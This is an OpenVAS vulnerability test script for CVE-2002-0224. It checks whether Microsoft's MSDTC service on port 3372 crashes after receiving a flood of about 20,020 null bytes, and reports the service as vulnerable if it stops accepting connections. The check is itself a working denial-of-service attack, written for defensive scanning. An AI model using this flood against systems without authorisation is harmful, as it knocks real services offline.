# OpenVAS Vulnerability Test
# $Id: msdtc_dos.nasl 9348 2018-04-06 07:01:19Z cfischer $
# Description: MSDTC denial of service by flooding with nul bytes
#
# Authors:
# Michel Arboi <arboi@alussinan.org>
#
# Copyright:
# Copyright (C) 2002  Michel Arboi
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
#

tag_summary = "It was possible to crash the MSDTC service by sending
20200 nul bytes.";

tag_solution = "Read the MS02-018 bulletin
http://www.microsoft.com/technet/security/bulletin/ms02-018.mspx";

# Crashes MSDTC

if(description)
{
 script_oid("1.3.6.1.4.1.25623.1.0.10939");
 script_version("$Revision: 9348 $");
 script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:01:19 +0200 (Fri, 06 Apr 2018) $");
 script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
 script_bugtraq_id(4006);
 script_tag(name:"cvss_base", value:"5.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_cve_id("CVE-2002-0224");
 name = "MSDTC denial of service by flooding with nul bytes";
 script_name(name);
 



 
 
 script_category(ACT_DENIAL);
  script_tag(name:"qod_type", value:"remote_vul");
 
 
 script_copyright("This script is Copyright (C) 2002  Michel Arboi");
 script_family("Denial of Service");
 script_dependencies("find_service.nasl");
 script_require_ports("Services/msdtc", 3372);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}


#
# Here we go
#
port = get_kb_item("Services/msdtc");
if(!port)port = 3372;
if(!get_port_state(port))exit(0);
soc = open_sock_tcp(port);
if(!soc)exit(0);
# 20020 = 20*1001
zer = raw_string(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
send(socket:soc, data:zer) x 1001;
close(soc);
sleep(2);

soc2 = open_sock_tcp(port);
if(!soc2)security_message(port);
